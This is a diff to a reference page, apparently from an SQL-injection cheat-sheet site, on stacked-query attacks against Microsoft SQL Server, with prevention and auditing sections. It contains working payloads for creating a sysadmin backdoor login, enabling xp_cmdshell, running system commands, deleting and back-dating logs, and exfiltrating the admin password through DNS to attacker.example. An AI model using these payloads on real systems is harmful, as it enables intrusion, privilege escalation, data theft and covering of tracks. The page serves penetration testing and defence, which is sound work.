@@ -4,7 +4,7 @@ description: Using multiple SQL statements in a single MSSQL injection
 category: Advanced Techniques
 order: 15
 tags: ["stacked queries", "multiple statements", "batch injection"]
-lastUpdated: 2025-03-15
+lastUpdated: 2026-10-08
 ---
 
 Stacked queries (also known as batch queries or query stacking) allow attackers to execute multiple SQL statements in a single injection. This technique significantly expands the capabilities of SQL injection attacks in Microsoft SQL Server, enabling operations beyond simple data extraction.
@@ -17,11 +17,11 @@ In SQL Server, multiple SQL statements can be separated by semicolons (`;`):
 SELECT * FROM users; DROP TABLE logs;
 ```
 
-This executes two separate queries: first selecting data, then dropping a table.
+This executes two separate queries: first selecting data, then dropping a table. The `;` is optional in T-SQL (`SELECT 1 SELECT 2` is also two statements), but it makes the payload clearer.
 
 ## How Stacked Queries Work
 
-When a database connector supports multiple statements, SQL Server will execute each statement sequentially. Stacked queries allow an attacker to:
+SQL Server accepts several statements in one batch, and the common drivers (ADO.NET `SqlClient`, ODBC, OLE DB, PHP `sqlsrv` and PDO, JDBC) send the whole query text as one batch, so stacked queries usually work against MSSQL. SQL Server executes each statement sequentially. Only the first result set is usually displayed by the application, so stacked queries are mostly used for their side effects or with blind and out-of-band techniques. Stacked queries allow an attacker to:
 
 1. Execute the original query (possibly modified)
 2. Add a statement terminator (`;`)
@@ -30,7 +30,7 @@ When a database connector supports multiple statements, SQL Server will execute 
 
 ## Detection Testing
 
-To test if stacked queries are possible:
+To test if stacked queries are possible (string context; for a numeric parameter drop the leading quote):
 
 ```sql
 ' ; SELECT 1 --
@@ -51,14 +51,14 @@ If the application pauses for 5 seconds with the second payload, it likely suppo
 ' ; INSERT INTO users (username, password, role) VALUES ('hacker', 'backdoor', 'admin') --
 
 -- Delete data
-' ; DELETE FROM audit_logs WHERE date < GETDATE() --
+' ; DELETE FROM logs WHERE created_at < GETDATE() --
 ```
 
 ### Schema Modification
 
 ```sql
 -- Add column
-' ; ALTER TABLE users ADD backdoor VARCHAR(100) --
+' ; ALTER TABLE users ADD notes VARCHAR(100) --
 
 -- Create new table
 ' ; CREATE TABLE backdoor (id INT IDENTITY(1,1), command VARCHAR(8000)) --
@@ -69,10 +69,12 @@ If the application pauses for 5 seconds with the second payload, it likely suppo
 
 ### Administrative Operations
 
+`CREATE LOGIN` needs `ALTER ANY LOGIN`, but adding a member to a fixed server role such as `sysadmin` needs membership in that role (`CONTROL SERVER` and `ALTER ANY SERVER ROLE` are not enough). `ALTER SERVER ROLE ... ADD MEMBER` is SQL Server 2012+:
+
 ```sql
--- Create database user
-' ; EXEC sp_addlogin 'backdoor', 'password' --
-' ; EXEC sp_addsrvrolemember 'backdoor', 'sysadmin' --
+-- Create a SQL login and add it to sysadmin (SQL Server 2012+; sp_addlogin and
+-- sp_addsrvrolemember still work but are deprecated)
+' ; CREATE LOGIN backdoor WITH PASSWORD = 'P@ssw0rd!2026'; ALTER SERVER ROLE sysadmin ADD MEMBER backdoor --
 
 -- Enable xp_cmdshell
 ' ; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE --
@@ -80,25 +82,27 @@ If the application pauses for 5 seconds with the second payload, it likely suppo
 
 ### Executing System Commands
 
+`xp_cmdshell` needs `sysadmin` (or a proxy account) and must be enabled; SQL Agent jobs need the Agent service running, and `CmdExec` steps need `sysadmin` or a proxy. Commands run as the SQL Server or SQL Agent service account. See [System Command Execution](/mssql/system-command-execution).
+
 ```sql
 -- Using xp_cmdshell (if enabled)
-' ; EXEC xp_cmdshell 'net user hacker password /add' --
+' ; EXEC xp_cmdshell 'whoami' --
 
--- Using SQL Agent job (if available)
-' ; EXEC msdb.dbo.sp_add_job @job_name='hack', @description='Backdoor';
-EXEC msdb.dbo.sp_add_jobstep @job_name='hack', @step_name='exec', @subsystem='CMDEXEC', @command='net user hacker password /add';
-EXEC msdb.dbo.sp_start_job 'hack' --
+-- Using a SQL Agent job; sp_add_jobserver assigns the job to the local server, without it the job never runs
+' ; EXEC msdb.dbo.sp_add_job @job_name='kb_job';
+EXEC msdb.dbo.sp_add_jobstep @job_name='kb_job', @step_name='exec', @subsystem='CMDEXEC', @command='whoami';
+EXEC msdb.dbo.sp_add_jobserver @job_name='kb_job';
+EXEC msdb.dbo.sp_start_job 'kb_job' --
 ```
 
 ### Information Gathering
 
-```sql
--- Extracting data to a readable location
-' ; SELECT * FROM credit_cards INTO OUTFILE '\\attacker\share\data.txt' --
+SQL Server has no `SELECT ... INTO OUTFILE` (that is MySQL); writing query results to a file needs `xp_cmdshell` with `bcp` or similar, see [Writing Files](/mssql/writing-files).
 
--- Using xp_dirtree to force DNS lookups for data exfiltration
-' ; DECLARE @q VARCHAR(8000); SET @q = (SELECT TOP 1 password FROM users WHERE username='admin');
-EXEC xp_dirtree '\\'+@q+'.attacker.com\share' --
+`xp_dirtree` with a UNC path makes the server resolve a host name, which leaks data through DNS to a domain you control. Procedure arguments must be constants or variables, so build the path in a variable first. This needs Windows and outbound DNS; the value must be valid in a host name (letters, digits, hyphens, at most 63 characters per label), so hex-encode arbitrary data:
+
+```sql
+' ; DECLARE @q VARCHAR(1024); SET @q = '\\' + (SELECT TOP 1 password FROM users WHERE username='admin') + '.attacker.example\share'; EXEC master..xp_dirtree @q --
 ```
 
 ## Advanced Techniques
@@ -117,24 +121,24 @@ EXEC xp_dirtree '\\'+@q+'.attacker.com\share' --
 
 ```sql
 -- Handling transactions
-' ; BEGIN TRANSACTION; UPDATE accounts SET balance = balance + 1000 WHERE account_id = 1234; COMMIT --
+' ; BEGIN TRANSACTION; UPDATE accounts SET balance = balance + 1000 WHERE id = 1; COMMIT --
 
 -- Rollback changes if there's an error
-' ; BEGIN TRY BEGIN TRANSACTION; UPDATE accounts SET balance = balance + 1000 WHERE account_id = 1234; COMMIT; END TRY BEGIN CATCH ROLLBACK; END CATCH --
+' ; BEGIN TRY BEGIN TRANSACTION; UPDATE accounts SET balance = balance + 1000 WHERE id = 1; COMMIT; END TRY BEGIN CATCH ROLLBACK; END CATCH --
 ```
 
 ### Error Handling
 
 ```sql
--- Using TRY...CATCH for error handling
-' ; BEGIN TRY EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; END TRY BEGIN CATCH END CATCH; EXEC xp_cmdshell 'dir C:\' --
+-- Using TRY...CATCH so a failing step does not abort the batch
+' ; BEGIN TRY EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; END TRY BEGIN CATCH END CATCH; EXEC xp_cmdshell 'whoami' --
 ```
 
 ### Conditional Execution
 
 ```sql
 -- Using IF statements for conditional execution
-' ; IF (SELECT COUNT(*) FROM sysobjects WHERE name = 'sensitive_data') > 0 BEGIN SELECT * FROM sensitive_data END --
+' ; IF OBJECT_ID('sensitive_data') IS NOT NULL BEGIN SELECT * FROM sensitive_data END --
 ```
 
 ## Real-World Impact Examples
@@ -142,8 +146,8 @@ EXEC xp_dirtree '\\'+@q+'.attacker.com\share' --
 ### Data Theft
 
 ```sql
--- Extract all user data with credentials
-' ; SELECT * FROM users WHERE 1=0; SELECT username, password, email FROM users; --
+-- Return credentials as a second result set (visible only if the application reads all result sets)
+' ; SELECT username, password, email FROM users --
 ```
 
 ### Backdoor Creation
@@ -160,16 +164,14 @@ END --
 
 ```sql
 -- Clean up traces
-' ; DELETE FROM logs WHERE activity LIKE '%login%'; UPDATE logs SET timestamp = DATEADD(day, -30, timestamp) --
+' ; DELETE FROM logs WHERE message LIKE '%login%'; UPDATE logs SET created_at = DATEADD(day, -30, created_at) --
 ```
 
 ## Prevention Techniques
 
 To prevent stacked query attacks:
 
-1. Use parameterized queries or stored procedures instead of string concatenation
-
-2. Use parameterized queries consistently
+1. Use parameterized queries consistently (stored procedures only help if they do not build dynamic SQL from their parameters)
 
    **Note:** ORMs like Entity Framework Core protect against SQL injection (including stacked queries) by using parameterized queries by default. There is no connection-level or batching setting that prevents stacked queries—the protection comes entirely from parameterization.
 
@@ -188,11 +190,11 @@ To prevent stacked query attacks:
    // If userInput = "1; DROP TABLE users--", both statements execute
    ```
 
-3. Apply the principle of least privilege for database accounts
+2. Apply the principle of least privilege for database accounts (no `sysadmin`, no DDL rights for the application login)
 
-4. Implement input validation - both whitelist and blacklist approaches
+3. Validate input against an allowlist (e.g. numeric IDs, known column names); blocklists are easy to bypass
 
-5. Consider using ORMs that protect against SQL injection by design
+4. Consider using ORMs that protect against SQL injection by design
 
 ## Defensive Implementation Examples
 
@@ -204,14 +206,20 @@ using (SqlConnection conn = new SqlConnection(connectionString))
     cmd.Parameters.AddWithValue("@username", userInput);
     // ...
 }
+```
 
-// PHP - Prepared statement (safe)
+```php
+// PHP (PDO with the sqlsrv driver) - Prepared statement (safe)
 $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
 $stmt->execute([$userInput]);
+```
 
-// Node.js - Parameterized query (safe)
-const query = 'SELECT * FROM users WHERE username = $1';
-client.query(query, [userInput]);
+```javascript
+// Node.js (mssql package) - Parameterized query (safe)
+const result = await pool
+  .request()
+  .input("username", sql.NVarChar, userInput)
+  .query("SELECT * FROM users WHERE username = @username");
 ```
 
 ## Detection and Response
@@ -224,9 +232,12 @@ To detect stacked query attacks:
 4. Set up auditing for sensitive operations:
 
 ```sql
--- Set up SQL Server auditing
-CREATE SERVER AUDIT SecurityAudit TO FILE;
+-- Set up SQL Server auditing (server audit in master, specification in the application database)
+CREATE SERVER AUDIT SecurityAudit TO FILE (FILEPATH = 'C:\SQLAudit\');
+ALTER SERVER AUDIT SecurityAudit WITH (STATE = ON);
+-- Database audit specifications: Enterprise edition before 2016 SP1, all editions since
 CREATE DATABASE AUDIT SPECIFICATION DbAuditSpec FOR SERVER AUDIT SecurityAudit
 ADD (DATABASE_OBJECT_CHANGE_GROUP),
-ADD (SELECT, UPDATE, INSERT, DELETE ON SCHEMA::dbo BY public);
+ADD (SELECT, UPDATE, INSERT, DELETE ON SCHEMA::dbo BY public)
+WITH (STATE = ON);
 ```
